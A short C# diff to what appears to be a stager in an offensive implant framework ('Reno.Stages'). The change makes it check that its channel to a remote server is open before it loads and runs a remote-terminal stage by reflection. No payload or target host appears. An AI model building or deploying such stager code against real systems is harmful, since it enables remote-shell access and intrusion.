@@ -91,11 +91,14 @@ namespace Stager
                         Console.WriteLine("[-] Error parsing port argument, using default of 443");
                     }
                     channel = new ClearChannel(server, port, compression);
-                    object[] p = new object[1];
-                    p[0] = channel;
-                    var terminalInstance = Activator.CreateInstance(type, p);
-                    var executeTerminal = type.GetMethod("Execute");
-                    executeTerminal.Invoke(terminalInstance, null);
+                    if (channel.IsOpen())
+                    {
+                        object[] p = new object[1];
+                        p[0] = channel;
+                        var terminalInstance = Activator.CreateInstance(type, p);
+                        var executeTerminal = type.GetMethod("Execute");
+                        executeTerminal.Invoke(terminalInstance, null);
+                    }
                 }
                 else if (type.FullName.Equals("Reno.Stages.DirectoryTraversal"))
                 {
